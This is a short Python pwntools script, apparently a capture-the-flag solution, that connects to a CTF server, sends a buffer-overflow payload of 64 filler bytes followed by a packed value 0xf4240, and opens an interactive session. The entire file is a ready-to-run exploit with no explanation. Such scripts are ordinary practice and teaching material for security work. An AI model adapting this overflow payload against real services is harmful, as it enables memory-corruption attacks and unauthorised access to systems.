from pwn import *

r = remote("ctf.j0n9hyun.xyz",3012)
print r.recvuntil(">")
payload = "a"*64
payload += p64(0xf4240)
r.sendline("asdf")
print r.recvrepeat(0.9)
r.sendline(payload)
print r.recvrepeat(0.8)

r.interactive()

